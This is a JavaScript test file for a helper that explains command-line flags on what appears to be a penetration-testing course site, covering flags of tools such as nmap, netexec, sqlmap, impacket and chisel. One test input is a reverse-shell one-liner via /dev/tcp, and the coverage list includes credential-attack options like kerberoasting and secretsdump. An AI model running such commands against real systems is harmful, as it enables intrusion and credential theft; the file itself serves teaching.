import { describe, expect, it } from 'vitest'
import {
  FLAGS,
  attributeCommands,
  isFlagToken,
  lookupFlag,
  normaliseCommand
} from '../flags.js'

describe('normaliseCommand', () => {
  it('passes a bare tool through', () => {
    expect(normaliseCommand('nmap')).toBe('nmap')
  })

  it('strips a leading ./ so ./chisel is chisel', () => {
    expect(normaliseCommand('./chisel')).toBe('chisel')
  })

  it('strips an absolute path', () => {
    expect(normaliseCommand('/usr/bin/nmap')).toBe('nmap')
  })

  it('strips a .exe suffix', () => {
    expect(normaliseCommand('chisel.exe')).toBe('chisel')
  })

  it('lowercases so PowerShell verbs match', () => {
    expect(normaliseCommand('Get-ADUser')).toBe('get-aduser')
  })

  it('resolves netexec/crackmapexec/cme onto nxc', () => {
    expect(normaliseCommand('netexec')).toBe('nxc')
    expect(normaliseCommand('crackmapexec')).toBe('nxc')
    expect(normaliseCommand('cme')).toBe('nxc')
  })

  it('returns null for something that is not a command word', () => {
    expect(normaliseCommand('')).toBeNull()
    expect(normaliseCommand('-u')).toBeNull()
  })
})

describe('isFlagToken', () => {
  it('accepts short and long flags', () => {
    expect(isFlagToken('-sV')).toBe(true)
    expect(isFlagToken('--top-ports')).toBe(true)
    expect(isFlagToken('-dc-ip')).toBe(true)
  })

  it('tolerates the leading space Shiki puts inside the span', () => {
    expect(isFlagToken(' -sV')).toBe(true)
  })

  it('rejects a bare dash, a negative number and a range', () => {
    expect(isFlagToken('-')).toBe(false)
    expect(isFlagToken('-1')).toBe(false)
    expect(isFlagToken('--')).toBe(false)
  })

  it('rejects anything with inner whitespace — that is a glued span', () => {
    // A `text`-language block emits one span per line; those must never decorate.
    expect(isFlagToken('-sC -sV')).toBe(false)
    expect(isFlagToken("'bash -i >& /dev/tcp/IP/4444 0>&1'")).toBe(false)
  })
})

describe('attributeCommands', () => {
  it('names the command on a simple line', () => {
    expect(attributeCommands(['nmap -sV 10.10.10.1'])).toEqual(['nmap'])
  })

  it('skips sudo and proxychains wrappers', () => {
    expect(attributeCommands(['sudo nmap -sS 10.10.10.1'])).toEqual(['nmap'])
    expect(attributeCommands(['proxychains4 nmap -sT 10.10.10.1'])).toEqual(['nmap'])
  })

  it('skips a leading environment assignment', () => {
    expect(attributeCommands(['KRB5CCNAME=x.ccache impacket-psexec -k dc'])).toEqual([
      'impacket-psexec'
    ])
  })

  it('returns null for a comment line', () => {
    expect(attributeCommands(['# nmap -sV is the version scan'])).toEqual([null])
  })

  it('returns null for a blank line', () => {
    expect(attributeCommands(['', '   '])).toEqual([null, null])
  })

  // This is the case the corpus scan actually caught: 16 lines whose first word
  // was `-`, because ffuf/sqlmap invocations wrap with a trailing backslash.
  it('inherits the command across a backslash continuation', () => {
    const lines = [
      'ffuf -w /usr/share/wordlists/dirb/common.txt \\',
      '  -u http://10.10.10.1/FUZZ \\',
      '  -mc 200,301 -fs 1234'
    ]
    expect(attributeCommands(lines)).toEqual(['ffuf', 'ffuf', 'ffuf'])
  })

  it('does not leak a command across a blank line', () => {
    expect(attributeCommands(['nmap -sV host', '', '  -oN out.txt'])).toEqual([
      'nmap',
      null,
      null
    ])
  })

  it('does not inherit from a comment line', () => {
    expect(attributeCommands(['# ffuf notes', '  -mc 200'])).toEqual([null, null])
  })

  it('handles a prompt-prefixed line', () => {
    expect(attributeCommands(['$ nmap -sV host'])).toEqual(['nmap'])
  })
})

describe('lookupFlag', () => {
  it('finds a tool-specific flag', () => {
    const hit = lookupFlag('nmap', '-sV')
    expect(hit).not.toBeNull()
    expect(hit.command).toBe('nmap')
    expect(hit.flag).toBe('-sV')
    expect(hit.text.length).toBeGreaterThan(20)
  })

  it('tolerates the leading space from the span text', () => {
    expect(lookupFlag('nmap', ' -sV')?.flag).toBe('-sV')
  })

  it('resolves through the alias table', () => {
    expect(lookupFlag('netexec', '--shares')?.command).toBe('nxc')
  })

  it('falls back to the shared table for a common unix flag', () => {
    const hit = lookupFlag('mkdir', '-p')
    expect(hit).not.toBeNull()
  })

  it('prefers the tool-specific meaning over the shared one', () => {
    // -p means "port" to nmap and "parents" to mkdir. Both must be right.
    expect(lookupFlag('nmap', '-p').text).not.toBe(lookupFlag('mkdir', '-p').text)
  })

  it('returns null for an unknown flag', () => {
    expect(lookupFlag('nmap', '--not-a-real-flag')).toBeNull()
  })

  it('returns null when the command is unknown and the flag is not shared', () => {
    expect(lookupFlag('totallyunknowntool', '--zzz')).toBeNull()
  })
})

describe('FLAGS coverage of the real corpus', () => {
  // Pairs harvested from the built pages on 2026-08-23 by walking every
  // <code class="nextra-code"> block: 157 blocks, 366 lines, 123 distinct pairs.
  const CORPUS = [
    ['nmap', ['-sV', '-sC', '-sT', '-sU', '-Pn', '-T4', '-oN', '-p', '-p-', '--top-ports', '--min-rate']],
    ['nxc', ['-u', '-p', '-d', '-H', '--shares', '--users', '--groups', '--sam', '--lsa', '--pass-pol', '--kerberoasting', '--asreproast']],
    ['sqlmap', ['-u', '-r', '-D', '-T', '--dbs', '--tables', '--dump', '--batch']],
    ['ffuf', ['-u', '-w', '-mc', '-fs', '-e', '-H', '-o']],
    ['gobuster', ['-u', '-w', '-x']],
    ['hydra', ['-l', '-P']],
    ['hashcat', ['-m', '--force']],
    ['evil-winrm', ['-i', '-u', '-p', '-H']],
    ['impacket-GetNPUsers', ['-dc-ip', '-format', '-no-pass', '-outputfile', '-usersfile']],
    ['impacket-GetUserSPNs', ['-dc-ip', '-request', '-outputfile']],
    ['impacket-secretsdump', ['-hashes', '-just-dc']],
    ['impacket-psexec', ['-hashes']],
    ['bloodhound-python', ['-u', '-p', '-d', '-ns', '-c', '--zip']],
    ['ldapsearch', ['-x', '-H', '-b', '-D', '-w']],
    ['smbclient', ['-L', '-N']],
    ['smbmap', ['-H']],
    ['enum4linux-ng', ['-A']],
    ['snmpwalk', ['-c', '-v2c']],
    ['curl', ['-A', '-L', '-o']],
    ['nc', ['-lvnp']],
    ['ssh', ['-D', '-L']],
    ['chisel', ['--reverse', '-p']],
    ['find', ['-perm', '-type', '-exec', '-quit']],
    ['python3', ['-c', '-m']],
    ['mkdir', ['-p']],
    ['grep', ['-rin']],
    ['ping', ['-c']],
    ['head', ['-n']],
    ['uname', ['-a']],
    ['ls', ['-la']],
    ['wget', ['-m']]
  ]

  it.each(CORPUS)('explains every %s flag used in the course', (cmd, flags) => {
    const missing = flags.filter((f) => lookupFlag(cmd, f) === null)
    expect(missing).toEqual([])
  })

  it('never ships an empty or placeholder explanation', () => {
    const bad = []
    for (const [cmd, table] of Object.entries(FLAGS)) {
      for (const [flag, text] of Object.entries(table)) {
        if (typeof text !== 'string' || text.trim().length < 15 || /TODO|FIXME/.test(text)) {
          bad.push(`${cmd} ${flag}`)
        }
      }
    }
    expect(bad).toEqual([])
  })
})
